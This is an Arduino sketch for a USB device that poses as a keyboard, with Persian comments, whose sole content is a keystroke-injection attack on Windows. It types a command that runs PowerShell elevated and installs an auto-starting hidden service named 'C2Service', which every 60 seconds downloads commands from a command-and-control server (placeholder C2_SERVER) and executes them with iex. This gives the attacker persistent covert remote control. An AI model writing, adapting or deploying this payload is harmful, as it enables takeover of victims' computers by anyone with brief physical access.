#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  // باز کردن PowerShell با دسترسی ادمین (بدون UAC)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  
  // ایجاد سرویس مخفی با ارتباط به سرور C2 هر 60 ثانیه
  Keyboard.println(F("powershell Start-Process powershell -Verb RunAs -ArgumentList '-Command \"sc.exe create C2Service binPath= \\\"cmd /c start /B powershell -WindowStyle Hidden -Command `\\\"while(1){try{iwr -Uri http://C2_SERVER/command -UseBasicParsing|iex; sleep 60}catch{}}`\\\"\\\" start= auto & sc.exe start C2Service\"'"));
}

void loop() {} 
